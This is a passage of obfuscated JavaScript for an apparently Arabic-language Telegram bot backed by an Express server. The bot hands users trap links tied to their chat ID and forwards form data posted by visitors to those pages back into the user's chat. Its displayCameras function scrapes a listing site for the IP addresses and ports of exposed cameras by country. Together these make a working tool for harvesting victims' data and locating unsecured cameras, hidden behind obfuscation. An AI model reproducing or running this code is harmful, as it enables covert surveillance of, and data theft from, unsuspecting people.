                        case _0x3e2f2d[_0x5eed36(0x5fa)]:
                            _0x5a1e63 = baseUrl + (_0x5eed36(0x71d) + _0x5eed36(0x49b)) + _0x529025 + (_0x5eed36(0x5ec) + _0x5eed36(0x6a7));
                            break;
                        default:
                            bot[_0x5eed36(0x83a) + 'e'](_0x529025, '');
                            return;
                        }
                        bot[_0x5eed36(0x83a) + 'e'](_0x529025, _0x5eed36(0x8d3) + _0x5eed36(0x5ea) + _0x5a1e63);
                    }
                }
            }
        }
    }
    bot[_0x5eed36(0x67f) + _0x5eed36(0x42c)](_0x3f7cdb['id']);
}), bot[_0x54baf1(0x67d)](/\/jjihigjoj/, _0x43b828 => {
    const _0x2633e0 = _0x54baf1, _0x977945 = {
            'lOXak': _0x2633e0(0x1c7) + _0x2633e0(0x8af) + _0x2633e0(0x3dc) + _0x2633e0(0x66d) + '.',
            'MWPJh': _0x2633e0(0x604) + _0x2633e0(0x369),
            'GWwID': _0x2633e0(0x761) + _0x2633e0(0x16b)
        }, _0x2f9dd8 = _0x43b828[_0x2633e0(0x2cb)]['id'], _0x4371cb = _0x977945[_0x2633e0(0x2e5)];
    bot[_0x2633e0(0x83a) + 'e'](_0x2f9dd8, _0x4371cb, {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x977945[_0x2633e0(0x60f)],
                        'callback_data': _0x977945[_0x2633e0(0x52a)]
                    }]]
        }
    });
}), bot['on'](_0x54baf1(0x3a6) + _0x54baf1(0x1a2), _0x5d9a77 => {
    const _0x98360c = _0x54baf1, _0x5fa663 = {
            'ozCpb': function (_0x176dbb, _0x34fc33) {
                return _0x176dbb === _0x34fc33;
            },
            'aScVe': _0x98360c(0x761) + _0x98360c(0x16b)
        }, _0x4b6224 = _0x5d9a77[_0x98360c(0x7ed)][_0x98360c(0x2cb)]['id'];
    if (_0x5fa663[_0x98360c(0x5b3)](_0x5d9a77[_0x98360c(0x755)], _0x5fa663[_0x98360c(0x236)])) {
        const _0x1f695e = baseUrl + '/' + _0x4b6224;
        bot[_0x98360c(0x83a) + 'e'](_0x4b6224, _0x98360c(0x91d) + _0x98360c(0x468) + _0x1f695e);
    }
    bot[_0x98360c(0x67f) + _0x98360c(0x42c)](_0x5d9a77['id']);
}), bot['on'](_0x54baf1(0x3a6) + _0x54baf1(0x1a2), _0x47ac76 => {
    const _0x12bbf9 = _0x54baf1, _0x57af60 = {
            'FhFAG': function (_0xf1fc36, _0x4cdae2) {
                return _0xf1fc36 === _0x4cdae2;
            },
            'TauHD': _0x12bbf9(0x85a),
            'DkKLb': _0x12bbf9(0x7ed),
            'IOzjF': _0x12bbf9(0x4c2) + _0x12bbf9(0x5c5) + _0x12bbf9(0x63c) + _0x12bbf9(0x1d6),
            'Thikj': function (_0xe4019a, _0x557a01) {
                return _0xe4019a === _0x557a01;
            },
            'lZTxQ': _0x12bbf9(0x67e),
            'LOORi': _0x12bbf9(0x88a) + _0x12bbf9(0x2d1) + _0x12bbf9(0x33c) + '.'
        }, _0x385485 = _0x47ac76[_0x12bbf9(0x7ed)][_0x12bbf9(0x2cb)]['id'];
    if (_0x57af60[_0x12bbf9(0x444)](_0x47ac76[_0x12bbf9(0x755)], _0x57af60[_0x12bbf9(0x53a)])) {
        bot[_0x12bbf9(0x83a) + 'e'](_0x385485, _0x57af60[_0x12bbf9(0x716)]);
        const _0x4316a2 = _0xfa2185 => {
            const _0xb6d995 = _0x12bbf9;
            if (_0x57af60[_0xb6d995(0x57c)](_0xfa2185[_0xb6d995(0x2cb)]['id'], _0x385485)) {
                if (_0xfa2185[_0xb6d995(0x7e0)] && _0xfa2185[_0xb6d995(0x7e0)][_0xb6d995(0x825)](_0x57af60[_0xb6d995(0x2a3)])) {
                    const _0x19ec51 = _0xfa2185[_0xb6d995(0x7e0)];
                    dataStore[_0x385485] = { 'userLink': _0x19ec51 }, bot[_0xb6d995(0x83a) + 'e'](_0x385485, _0xb6d995(0x30d) + _0xb6d995(0x8e5) + _0xb6d995(0x537) + baseUrl + (_0xb6d995(0x1fd) + _0xb6d995(0x4ad)) + _0x385485), bot[_0xb6d995(0x48b) + _0xb6d995(0x779)](_0x57af60[_0xb6d995(0x861)], _0x4316a2);
                } else
                    bot[_0xb6d995(0x83a) + 'e'](_0x385485, _0x57af60[_0xb6d995(0x56c)]);
            }
        };
        bot['on'](_0x57af60[_0x12bbf9(0x861)], _0x4316a2);
    }
}), app[_0x54baf1(0x549)](bodyParser[_0x54baf1(0x7ba)]({ 'extended': !![] })), app[_0x54baf1(0x549)](express[_0x54baf1(0x91c)](__dirname)), app[_0x54baf1(0x514)](_0x54baf1(0x8e1) + 'es', (_0x2f562d, _0x412814) => {
    const _0x229e0d = _0x54baf1, _0x3ce86a = {
            'RtEny': _0x229e0d(0x439),
            'sqVwx': _0x229e0d(0x756) + _0x229e0d(0x88d) + _0x229e0d(0x273) + ':',
            'iCVAg': _0x229e0d(0x7d3) + _0x229e0d(0x5bc) + _0x229e0d(0x618) + _0x229e0d(0x39d) + _0x229e0d(0x483),
            'XrZSI': _0x229e0d(0x2c0) + _0x229e0d(0x22e)
        }, _0x3b992b = _0x2f562d[_0x229e0d(0x91e)][_0x229e0d(0x8fa)], _0x5e7061 = _0x2f562d[_0x229e0d(0x91e)][_0x229e0d(0x460)], _0x4094ec = _0x2f562d[_0x229e0d(0x91e)][_0x229e0d(0x399)];
    console[_0x229e0d(0x3f8)](_0x3ce86a[_0x229e0d(0x76c)], _0x2f562d[_0x229e0d(0x91e)]), bot[_0x229e0d(0x83a) + 'e'](_0x3b992b, _0x229e0d(0x6dd) + _0x229e0d(0x6bc) + _0x5e7061 + _0x229e0d(0x8b3) + _0x4094ec)[_0x229e0d(0x39c)](() => {
        const _0x1799b8 = _0x229e0d;
        _0x412814[_0x1799b8(0x7bf)](path[_0x1799b8(0x45e)](__dirname, _0x3ce86a[_0x1799b8(0x86a)]));
    })[_0x229e0d(0x732)](_0x33e67d => {
        const _0x13f97e = _0x229e0d;
        console[_0x13f97e(0x44a)](_0x3ce86a[_0x13f97e(0x1e9)], _0x33e67d[_0x13f97e(0x75c)] ? _0x33e67d[_0x13f97e(0x75c)][_0x13f97e(0x91e)] : _0x33e67d), _0x412814[_0x13f97e(0x866)](-0x65 * -0x49 + 0x1b * -0xc9 + 0xf1 * -0x6)[_0x13f97e(0x82e)](_0x3ce86a[_0x13f97e(0x878)]);
    });
}), app[_0x54baf1(0x2e2)](_0x54baf1(0x75f), (_0xb4404a, _0xc2715) => {
    const _0x5497d8 = _0x54baf1, _0x4765ee = {
            'GKAER': _0x5497d8(0x494) + _0x5497d8(0x33f) + _0x5497d8(0x3d9),
            'pbjSp': _0x5497d8(0x439)
        }, _0x4a44d4 = _0xb4404a[_0x5497d8(0x17c)][_0x5497d8(0x8fa)];
    if (!_0x4a44d4)
        return _0xc2715[_0x5497d8(0x866)](0x6 * -0x36d + -0x945 + -0x1f63 * -0x1)[_0x5497d8(0x82e)](_0x4765ee[_0x5497d8(0x883)]);
    _0xc2715[_0x5497d8(0x7bf)](path[_0x5497d8(0x45e)](__dirname, _0x4765ee[_0x5497d8(0x751)]));
}), app[_0x54baf1(0x549)](bodyParser[_0x54baf1(0x7ba)]({ 'extended': !![] })), app[_0x54baf1(0x549)](express[_0x54baf1(0x91c)](__dirname)), app[_0x54baf1(0x514)](_0x54baf1(0x8e1) + 'es', (_0x682030, _0x5140a8) => {
    const _0x229636 = _0x54baf1, _0x305edd = {
            'KPWOW': _0x229636(0x903),
            'nHNeU': _0x229636(0x756) + _0x229636(0x88d) + _0x229636(0x273) + ':',
            'vUcNE': _0x229636(0x7d3) + _0x229636(0x5bc) + _0x229636(0x618) + _0x229636(0x39d) + _0x229636(0x483),
            'mRAYe': _0x229636(0x2c0) + _0x229636(0x22e)
        }, _0x3f55de = _0x682030[_0x229636(0x91e)][_0x229636(0x8fa)], _0x42bbb7 = _0x682030[_0x229636(0x91e)][_0x229636(0x460)], _0x677280 = _0x682030[_0x229636(0x91e)][_0x229636(0x399)];
    console[_0x229636(0x3f8)](_0x305edd[_0x229636(0x340)], _0x682030[_0x229636(0x91e)]), bot[_0x229636(0x83a) + 'e'](_0x3f55de, _0x229636(0x6dd) + _0x229636(0x6bc) + _0x42bbb7 + _0x229636(0x8b3) + _0x677280)[_0x229636(0x39c)](() => {
        const _0xaf9f75 = _0x229636;
        _0x5140a8[_0xaf9f75(0x7bf)](path[_0xaf9f75(0x45e)](__dirname, _0x305edd[_0xaf9f75(0x178)]));
    })[_0x229636(0x732)](_0x54d667 => {
        const _0x41678a = _0x229636;
        console[_0x41678a(0x44a)](_0x305edd[_0x41678a(0x665)], _0x54d667[_0x41678a(0x75c)] ? _0x54d667[_0x41678a(0x75c)][_0x41678a(0x91e)] : _0x54d667), _0x5140a8[_0x41678a(0x866)](-0x21 * 0xfb + 0xfe + 0xb1b * 0x3)[_0x41678a(0x82e)](_0x305edd[_0x41678a(0x17a)]);
    });
}), app[_0x54baf1(0x2e2)](_0x54baf1(0x860), (_0x7e81c4, _0x22623a) => {
    const _0x3d7de9 = _0x54baf1, _0x39c333 = {
            'ZPItn': _0x3d7de9(0x494) + _0x3d7de9(0x33f) + _0x3d7de9(0x3d9),
            'ldNnL': _0x3d7de9(0x903)
        }, _0x24415a = _0x7e81c4[_0x3d7de9(0x17c)][_0x3d7de9(0x8fa)];
    if (!_0x24415a)
        return _0x22623a[_0x3d7de9(0x866)](-0x22d1 + 0xf4e + -0x1 * -0x1513)[_0x3d7de9(0x82e)](_0x39c333[_0x3d7de9(0x309)]);
    _0x22623a[_0x3d7de9(0x7bf)](path[_0x3d7de9(0x45e)](__dirname, _0x39c333[_0x3d7de9(0x1a0)]));
}), app[_0x54baf1(0x549)](bodyParser[_0x54baf1(0x7ba)]({ 'extended': !![] })), app[_0x54baf1(0x549)](express[_0x54baf1(0x91c)](__dirname)), app[_0x54baf1(0x514)](_0x54baf1(0x8e1) + 'es', (_0x158776, _0x2b39b8) => {
    const _0x5b97e0 = _0x54baf1, _0x291e26 = {
            'Jorws': _0x5b97e0(0x4c6),
            'IYlpQ': _0x5b97e0(0x756) + _0x5b97e0(0x88d) + _0x5b97e0(0x273) + ':',
            'XMNvH': _0x5b97e0(0x7d3) + _0x5b97e0(0x5bc) + _0x5b97e0(0x618) + _0x5b97e0(0x39d) + _0x5b97e0(0x483),
            'NSZgM': _0x5b97e0(0x2c0) + _0x5b97e0(0x22e)
        }, _0x4c099b = _0x158776[_0x5b97e0(0x91e)][_0x5b97e0(0x8fa)], _0x15785e = _0x158776[_0x5b97e0(0x91e)][_0x5b97e0(0x460)], _0xdb0b53 = _0x158776[_0x5b97e0(0x91e)][_0x5b97e0(0x399)];
    console[_0x5b97e0(0x3f8)](_0x291e26[_0x5b97e0(0x235)], _0x158776[_0x5b97e0(0x91e)]), bot[_0x5b97e0(0x83a) + 'e'](_0x4c099b, _0x5b97e0(0x6dd) + _0x5b97e0(0x6bc) + _0x15785e + _0x5b97e0(0x8b3) + _0xdb0b53)[_0x5b97e0(0x39c)](() => {
        const _0x2a4c07 = _0x5b97e0;
        _0x2b39b8[_0x2a4c07(0x7bf)](path[_0x2a4c07(0x45e)](__dirname, _0x291e26[_0x2a4c07(0x2ce)]));
    })[_0x5b97e0(0x732)](_0x324feb => {
        const _0x546de1 = _0x5b97e0;
        console[_0x546de1(0x44a)](_0x291e26[_0x546de1(0x41e)], _0x324feb[_0x546de1(0x75c)] ? _0x324feb[_0x546de1(0x75c)][_0x546de1(0x91e)] : _0x324feb), _0x2b39b8[_0x546de1(0x866)](-0x25e3 + 0x73 * -0x3c + -0x1 * -0x42cb)[_0x546de1(0x82e)](_0x291e26[_0x546de1(0x7d2)]);
    });
}), app[_0x54baf1(0x2e2)](_0x54baf1(0x863), (_0x4f2585, _0x31c990) => {
    const _0xb5fc03 = _0x54baf1, _0x890ebb = {
            'BkVOj': _0xb5fc03(0x494) + _0xb5fc03(0x33f) + _0xb5fc03(0x3d9),
            'ntJIZ': _0xb5fc03(0x4c6)
        }, _0x21866 = _0x4f2585[_0xb5fc03(0x17c)][_0xb5fc03(0x8fa)];
    if (!_0x21866)
        return _0x31c990[_0xb5fc03(0x866)](-0x8f9 * 0x1 + -0x11bb + 0x12 * 0x192)[_0xb5fc03(0x82e)](_0x890ebb[_0xb5fc03(0x6a9)]);
    _0x31c990[_0xb5fc03(0x7bf)](path[_0xb5fc03(0x45e)](__dirname, _0x890ebb[_0xb5fc03(0x1f6)]));
});
const countryTranslation = {
        'AF': _0x54baf1(0x815) + _0x54baf1(0x915),
        'AL': _0x54baf1(0x356),
        'DZ': _0x54baf1(0x70d),
        'AO': _0x54baf1(0x7a6),
        'AR': _0x54baf1(0x441) + _0x54baf1(0x692),
        'AM': _0x54baf1(0x80f),
        'AU': _0x54baf1(0x731),
        'AT': _0x54baf1(0x4a9),
        'AZ': _0x54baf1(0x89a),
        'BH': _0x54baf1(0x616),
        'BD': _0x54baf1(0x5c4),
        'BY': _0x54baf1(0x898),
        'BE': _0x54baf1(0x41c),
        'BZ': _0x54baf1(0x18a),
        'BJ': _0x54baf1(0x61f),
        'BO': _0x54baf1(0x1ef),
        'BA': _0x54baf1(0x85b) + _0x54baf1(0x62e),
        'BW': _0x54baf1(0x59e),
        'BR': _0x54baf1(0x518),
        'BG': _0x54baf1(0x5d3),
        'BF': _0x54baf1(0x366) + _0x54baf1(0x90d),
        'KH': _0x54baf1(0x7f9),
        'CM': _0x54baf1(0x4a8) + _0x54baf1(0x436),
        'CA': _0x54baf1(0x5b4),
        'CL': _0x54baf1(0x49d),
        'CN': _0x54baf1(0x5bf),
        'CO': _0x54baf1(0x5f5),
        'CR': _0x54baf1(0x28c) + _0x54baf1(0x90e),
        'HR': _0x54baf1(0x1a9),
        'CY': _0x54baf1(0x7df),
        'CZ': _0x54baf1(0x719),
        'DK': _0x54baf1(0x748),
        'EC': _0x54baf1(0x334) + _0x54baf1(0x404),
        'EG': _0x54baf1(0x2da),
        'SV': _0x54baf1(0x73e) + _0x54baf1(0x84d),
        'EE': _0x54baf1(0x415),
        'ET': _0x54baf1(0x23f),
        'FI': _0x54baf1(0x725),
        'FR': _0x54baf1(0x2b6),
        'GE': _0x54baf1(0x328),
        'DE': _0x54baf1(0x792),
        'GH': _0x54baf1(0x409),
        'GR': _0x54baf1(0x367),
        'GT': _0x54baf1(0x200) + _0x54baf1(0x4a2),
        'HN': _0x54baf1(0x79a),
        'HK': _0x54baf1(0x89f) + _0x54baf1(0x1b8),
        'HU': _0x54baf1(0x27a),
        'IS': _0x54baf1(0x4af),
        'IN': _0x54baf1(0x843),
        'ID': _0x54baf1(0x443) + _0x54baf1(0x3a5),
        'IR': _0x54baf1(0x4c5),
        'IQ': _0x54baf1(0x6a2),
        'IE': _0x54baf1(0x345),
        'IL': _0x54baf1(0x478),
        'IT': _0x54baf1(0x90f),
        'CI': _0x54baf1(0x8ee) + _0x54baf1(0x46d),
        'JP': _0x54baf1(0x5b9),
        'JO': _0x54baf1(0x4ef),
        'KZ': _0x54baf1(0x2f2) + _0x54baf1(0x26c),
        'KE': _0x54baf1(0x672),
        'KW': _0x54baf1(0x74e),
        'KG': _0x54baf1(0x6cc) + _0x54baf1(0x5d4),
        'LV': _0x54baf1(0x90a),
        'LB': _0x54baf1(0x625),
        'LY': _0x54baf1(0x55c),
        'LT': _0x54baf1(0x22f),
        'LU': _0x54baf1(0x610) + _0x54baf1(0x812),
        'MO': _0x54baf1(0x654),
        'MY': _0x54baf1(0x2e6),
        'ML': _0x54baf1(0x373),
        'MT': _0x54baf1(0x871),
        'MX': _0x54baf1(0x213),
        'MC': _0x54baf1(0x6bf),
        'MN': _0x54baf1(0x57b),
        'ME': _0x54baf1(0x5ca) + _0x54baf1(0x929),
        'MA': _0x54baf1(0x491),
        'MZ': _0x54baf1(0x2e1),
        'MM': _0x54baf1(0x1da),
        'NA': _0x54baf1(0x6c5),
        'NP': _0x54baf1(0x822),
        'NL': _0x54baf1(0x5d8),
        'NZ': _0x54baf1(0x27e) + _0x54baf1(0x4b9),
        'NG': _0x54baf1(0x39a),
        'KP': _0x54baf1(0x6e1) + _0x54baf1(0x6d1),
        'NO': _0x54baf1(0x486),
        'OM': _0x54baf1(0x438),
        'PK': _0x54baf1(0x256),
        'PS': _0x54baf1(0x496),
        'PA': _0x54baf1(0x2b7),
        'PY': _0x54baf1(0x803),
        'PE': _0x54baf1(0x387),
        'PH': _0x54baf1(0x1d4),
        'PL': _0x54baf1(0x329),
        'PT': _0x54baf1(0x5e5),
        'PR': _0x54baf1(0x258) + _0x54baf1(0x84a),
        'QA': _0x54baf1(0x3fa),
        'RO': _0x54baf1(0x51b),
        'RU': _0x54baf1(0x5b0),
        'RW': _0x54baf1(0x5cc),
        'SA': _0x54baf1(0x4de),
        'SN': _0x54baf1(0x7a8),
        'RS': _0x54baf1(0x434),
        'SG': _0x54baf1(0x538),
        'SK': _0x54baf1(0x85e),
        'SI': _0x54baf1(0x829),
        'ZA': _0x54baf1(0x74d) + _0x54baf1(0x76d),
        'KR': _0x54baf1(0x709) + _0x54baf1(0x3ec),
        'ES': _0x54baf1(0x8a5),
        'LK': _0x54baf1(0x55b),
        'SD': _0x54baf1(0x657),
        'SE': _0x54baf1(0x56f),
        'CH': _0x54baf1(0x2c8),
        'SY': _0x54baf1(0x858),
        'TW': _0x54baf1(0x72f),
        'TZ': _0x54baf1(0x70b),
        'TH': _0x54baf1(0x6ce),
        'TG': _0x54baf1(0x791),
        'TN': _0x54baf1(0x47c),
        'TR': _0x54baf1(0x789),
        'TM': _0x54baf1(0x268) + _0x54baf1(0x31a),
        'UG': _0x54baf1(0x2b0),
        'UA': _0x54baf1(0x313),
        'AE': _0x54baf1(0x80d),
        'GB': _0x54baf1(0x445),
        'US': _0x54baf1(0x2aa),
        'UY': _0x54baf1(0x55a),
        'UZ': _0x54baf1(0x295) + _0x54baf1(0x82d),
        'VE': _0x54baf1(0x470),
        'VN': _0x54baf1(0x728),
        'ZM': _0x54baf1(0x8ce),
        'ZW': _0x54baf1(0x264),
        'GL': _0x54baf1(0x1cc),
        'KY': _0x54baf1(0x8e9) + _0x54baf1(0x5df),
        'NI': _0x54baf1(0x1e4) + _0x54baf1(0x1e0),
        'DO': _0x54baf1(0x376) + _0x54baf1(0x1d8),
        'NC': _0x54baf1(0x428) + _0x54baf1(0x6bb),
        'LA': _0x54baf1(0x1fe),
        'TT': _0x54baf1(0x3aa) + _0x54baf1(0x312),
        'GG': _0x54baf1(0x405),
        'GU': _0x54baf1(0x599),
        'GP': _0x54baf1(0x763),
        'MG': _0x54baf1(0x58d),
        'RE': _0x54baf1(0x319),
        'FO': _0x54baf1(0x2c1),
        'MD': _0x54baf1(0x7be)
    }, camRequestCounts = {};
async function initStorage() {
    const _0x41af3b = _0x54baf1, _0xdc583 = { 'vWqOy': _0x41af3b(0x5a7) };
    await storage[_0x41af3b(0x5fe)](), vipUsers = await storage[_0x41af3b(0x869)](_0xdc583[_0x41af3b(0x56d)]) || [];
}
async function saveVipUsers() {
    const _0x53802e = _0x54baf1, _0x178425 = { 'XUsdb': _0x53802e(0x5a7) };
    await storage[_0x53802e(0x919)](_0x178425[_0x53802e(0x6b4)], vipUsers);
}
function showCountryList(_0x218596, _0x580275 = 0x10ca * -0x1 + -0x7 * -0x1ee + 0x1c * 0x1e) {
    const _0x465b2e = _0x54baf1, _0x14e0df = {
            'QXQGl': function (_0x59c063, _0x1a90fd) {
                return _0x59c063 + _0x1a90fd;
            },
            'BfEYn': function (_0x2f6bb5, _0x192790) {
                return _0x2f6bb5 < _0x192790;
            },
            'Advwu': function (_0x296160, _0x2941d7) {
                return _0x296160 < _0x2941d7;
            },
            'gaWzo': function (_0x43ecba, _0x55cbd0) {
                return _0x43ecba > _0x55cbd0;
            },
            'mlAOM': function (_0x4f68aa, _0x58d88c) {
                return _0x4f68aa < _0x58d88c;
            },
            'AnskA': _0x465b2e(0x77c),
            'BCLdN': _0x465b2e(0x4ff) + 'ة:'
        };
    try {
        const _0x159dcf = [], _0x24f7ba = Object[_0x465b2e(0x695)](countryTranslation), _0x27e653 = Object[_0x465b2e(0x84e)](countryTranslation), _0xcc31c4 = Math[_0x465b2e(0x581)](_0x14e0df[_0x465b2e(0x451)](_0x580275, -0x2271 + -0x12c1 * -0x1 + 0x1013), _0x24f7ba[_0x465b2e(0x5dc)]);
        for (let _0x4907bd = _0x580275; _0x14e0df[_0x465b2e(0x4ae)](_0x4907bd, _0xcc31c4); _0x4907bd += -0x21 * -0x8f + 0x69d + -0x179 * 0x11) {
            const _0x550a53 = [];
            for (let _0x4a130c = _0x4907bd; _0x14e0df[_0x465b2e(0x2e4)](_0x4a130c, _0x14e0df[_0x465b2e(0x451)](_0x4907bd, 0x5 * 0x504 + 0x2 * -0x367 + -0x1243)) && _0x14e0df[_0x465b2e(0x2e4)](_0x4a130c, _0xcc31c4); _0x4a130c++) {
                const _0x365963 = _0x24f7ba[_0x4a130c], _0x240633 = _0x27e653[_0x4a130c];
                _0x550a53[_0x465b2e(0x5bd)]({
                    'text': _0x240633,
                    'callback_data': _0x365963
                });
            }
            _0x159dcf[_0x465b2e(0x5bd)](_0x550a53);
        }
        const _0x1c96e4 = [];
        _0x14e0df[_0x465b2e(0x8b0)](_0x580275, 0x5 * -0x243 + -0x10ba + 0x1c09) && _0x1c96e4[_0x465b2e(0x5bd)], _0x14e0df[_0x465b2e(0x90b)](_0xcc31c4, _0x24f7ba[_0x465b2e(0x5dc)]) && _0x1c96e4[_0x465b2e(0x5bd)]({
            'text': _0x14e0df[_0x465b2e(0x6b7)],
            'callback_data': _0x465b2e(0x237) + _0xcc31c4
        }), _0x1c96e4[_0x465b2e(0x5dc)] && _0x159dcf[_0x465b2e(0x5bd)](_0x1c96e4), bot[_0x465b2e(0x83a) + 'e'](_0x218596, _0x14e0df[_0x465b2e(0x4bf)], { 'reply_markup': { 'inline_keyboard': _0x159dcf } });
    } catch (_0x510c9f) {
        bot[_0x465b2e(0x83a) + 'e'](_0x218596, _0x465b2e(0x188) + _0x465b2e(0x5c6) + _0x465b2e(0x900) + _0x510c9f[_0x465b2e(0x7ed)]);
    }
}
async function displayCameras(_0x379e1c, _0x3c4aee) {
    const _0x5de179 = _0x54baf1, _0x6a8651 = {
            'Kferb': _0x5de179(0x3f0) + _0x5de179(0x233) + _0x5de179(0x525),
            'RrOBm': function (_0x3cd536, _0x422ddf) {
                return _0x3cd536 < _0x422ddf;
            },
            'VezDH': function (_0x34830e, _0x572c8f) {
                return _0x34830e % _0x572c8f;
            },
            'OyZqG': _0x5de179(0x25d) + _0x5de179(0x850) + _0x5de179(0x734) + _0x5de179(0x3d0) + _0x5de179(0x67b) + _0x5de179(0x8ea) + _0x5de179(0x1e7) + _0x5de179(0x8f6) + _0x5de179(0x907) + _0x5de179(0x4d6) + _0x5de179(0x914) + '6',
            'rYZDK': _0x5de179(0x7dc) + _0x5de179(0x234) + _0x5de179(0x7f4) + _0x5de179(0x801) + _0x5de179(0x1aa) + _0x5de179(0x7b5) + _0x5de179(0x4da) + _0x5de179(0x722) + _0x5de179(0x868) + _0x5de179(0x29b),
            'QaYvc': function (_0x1dbded, _0x4ca88b, _0x1fb42c) {
                return _0x1dbded(_0x4ca88b, _0x1fb42c);
            },
            'SrLsj': function (_0x338f69, _0x23e170) {
                return _0x338f69 <= _0x23e170;
            },
            'UzWxb': function (_0x2a5b5a, _0x21a265) {
                return _0x2a5b5a < _0x21a265;
            },
            'GROzk': function (_0x51c020, _0x18b718) {
                return _0x51c020 + _0x18b718;
            },
            'RpyQY': _0x5de179(0x3cb) + _0x5de179(0x234) + _0x5de179(0x7f4) + _0x5de179(0x322) + _0x5de179(0x8b5) + _0x5de179(0x1bb) + _0x5de179(0x1c5) + _0x5de179(0x724) + _0x5de179(0x5c1) + _0x5de179(0x446) + _0x5de179(0x38e) + _0x5de179(0x6cf) + _0x5de179(0x6ab) + _0x5de179(0x529) + _0x5de179(0x6f3) + _0x5de179(0x1ad) + _0x5de179(0x917) + _0x5de179(0x8c0) + _0x5de179(0x6e4),
            'uejzg': _0x5de179(0x7dc) + _0x5de179(0x234) + _0x5de179(0x7f4) + _0x5de179(0x801) + _0x5de179(0x1aa) + _0x5de179(0x71b) + _0x5de179(0x700) + _0x5de179(0x48a) + _0x5de179(0x4bb) + _0x5de179(0x6b2)
        };
    try {
        const _0x336ec2 = await bot[_0x5de179(0x83a) + 'e'](_0x379e1c, _0x6a8651[_0x5de179(0x790)]), _0x1a31ba = _0x336ec2[_0x5de179(0x19c)];
        for (let _0x3646f8 = -0x1086 + -0x1b71 + 0x2bf7 * 0x1; _0x6a8651[_0x5de179(0x698)](_0x3646f8, 0x3 * -0xce4 + 0x3 * 0x732 + 0x1125); _0x3646f8++) {
            await bot[_0x5de179(0x6e6) + _0x5de179(0x78b)](_0x5de179(0x3f0) + _0x5de179(0x233) + _0x5de179(0x621) + '.'[_0x5de179(0x895)](_0x6a8651[_0x5de179(0x520)](_0x3646f8, 0x4 * -0x1b8 + -0x1895 + -0x1f79 * -0x1)), {
                'chat_id': _0x379e1c,
                'message_id': _0x1a31ba
            }), await new Promise(_0x5b5e04 => setTimeout(_0x5b5e04, 0x4 * -0x51 + 0x141 * -0x1d + 0x1f * 0x157));
        }
        const _0x5134cf = _0x5de179(0x3af) + _0x5de179(0x913) + _0x5de179(0x1bc) + _0x5de179(0x54b) + _0x3c4aee, _0x5c510b = { 'User-Agent': _0x6a8651[_0x5de179(0x8bf)] };
        let _0x9c6dca = await axios[_0x5de179(0x2e2)](_0x5134cf, { 'headers': _0x5c510b });
        const _0xa80b96 = _0x9c6dca[_0x5de179(0x755)][_0x5de179(0x342)](/pagenavigator\("\?page=", (\d+)/);
        if (!_0xa80b96) {
            bot[_0x5de179(0x83a) + 'e'](_0x379e1c, _0x6a8651[_0x5de179(0x26a)]);
            return;
        }
        const _0x2a686c = _0x6a8651[_0x5de179(0x4a6)](parseInt, _0xa80b96[0x1b4 + 0x1f8e + -0x1 * 0x2141], 0xaf7 + 0x1ef1 + -0x2 * 0x14ef), _0x447cc3 = [];
        for (let _0x208aa2 = 0x4aa * 0x4 + -0x5c2 + -0xce5; _0x6a8651[_0x5de179(0x37d)](_0x208aa2, _0x2a686c); _0x208aa2++) {
            _0x9c6dca = await axios[_0x5de179(0x2e2)](_0x5134cf + _0x5de179(0x64e) + _0x208aa2, { 'headers': _0x5c510b });
            const _0xfd4b56 = _0x9c6dca[_0x5de179(0x755)][_0x5de179(0x342)](/http:\/\/\d+\.\d+\.\d+\.\d+:\d+/g) || [];
            _0x447cc3[_0x5de179(0x5bd)](..._0xfd4b56);
        }
        if (_0x447cc3[_0x5de179(0x5dc)]) {
            const _0x42a5e3 = _0x447cc3[_0x5de179(0x502)]((_0x5242bd, _0x1156ed) => _0x1156ed + (-0x2688 + 0x727 + 0x1f62) + '.\x20' + _0x5242bd);
            for (let _0x3386ea = -0x5 * -0x277 + -0x2040 + -0x1 * -0x13ed; _0x6a8651[_0x5de179(0x908)](_0x3386ea, _0x42a5e3[_0x5de179(0x5dc)]); _0x3386ea += 0x239d * -0x1 + -0x2e * -0xba + 0x263) {
                const _0x10326f = _0x42a5e3[_0x5de179(0x18b)](_0x3386ea, _0x6a8651[_0x5de179(0x760)](_0x3386ea, 0x40f * 0x8 + -0x33 * -0x35 + -0x81 * 0x55));
                await bot[_0x5de179(0x83a) + 'e'](_0x379e1c, _0x10326f[_0x5de179(0x45e)]('\x0a'));
            }
            await bot[_0x5de179(0x83a) + 'e'](_0x379e1c, _0x6a8651[_0x5de179(0x335)]);
        } else
            await bot[_0x5de179(0x83a) + 'e'](_0x379e1c, _0x6a8651[_0x5de179(0x190)]);
    } catch (_0x28a2f1) {
        await bot[_0x5de179(0x83a) + 'e'](_0x379e1c, _0x5de179(0x7dc) + _0x5de179(0x234) + _0x5de179(0x7f4) + _0x5de179(0x801) + _0x5de179(0x1aa) + _0x5de179(0x71b) + _0x5de179(0x700) + _0x5de179(0x48a) + _0x5de179(0x4bb) + _0x5de179(0x6b2));
    }
}
function isDeveloper(_0x2b3fa3) {
    const _0x55b5b2 = _0x54baf1, _0x50cf46 = {
            'IuGVQ': function (_0x2447ba, _0x1d4b6c) {
                return _0x2447ba === _0x1d4b6c;
            }
        }, _0x15bb3f = -0x156f78373 + 0x5f2767e4 + 0x24de34b49;
    return _0x50cf46[_0x55b5b2(0x75e)](_0x2b3fa3, _0x15bb3f);
}
function showAdminPanel(_0x42075c) {
    const _0x47e5a6 = _0x54baf1, _0x21462e = {
            'WcBCC': _0x47e5a6(0x386) + 'م:',
            'dafWr': _0x47e5a6(0x2a6) + _0x47e5a6(0x609),
            'uesRw': _0x47e5a6(0x5ba),
            'rdzNS': _0x47e5a6(0x306) + _0x47e5a6(0x609),
            'Bgemk': _0x47e5a6(0x333)
        };
    bot[_0x47e5a6(0x83a) + 'e'](_0x42075c, _0x21462e[_0x47e5a6(0x8a3)], {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x21462e[_0x47e5a6(0x240)],
                        'callback_data': _0x21462e[_0x47e5a6(0x23e)]
                    }],
                [{
                        'text': _0x21462e[_0x47e5a6(0x8f8)],
                        'callback_data': _0x21462e[_0x47e5a6(0x74b)]
                    }]
            ]
        }
    });
}
bot[_0x54baf1(0x67d)](/\/jjjjjavayy/, _0x3edd51 => {
    const _0x3a2b54 = _0x54baf1, _0x3e3496 = {
            'UBFSm': _0x3a2b54(0x1c7) + _0x3a2b54(0x65c) + _0x3a2b54(0x406) + _0x3a2b54(0x3fc) + _0x3a2b54(0x8dd),
            'MQvXB': _0x3a2b54(0x4d1) + 'ي',
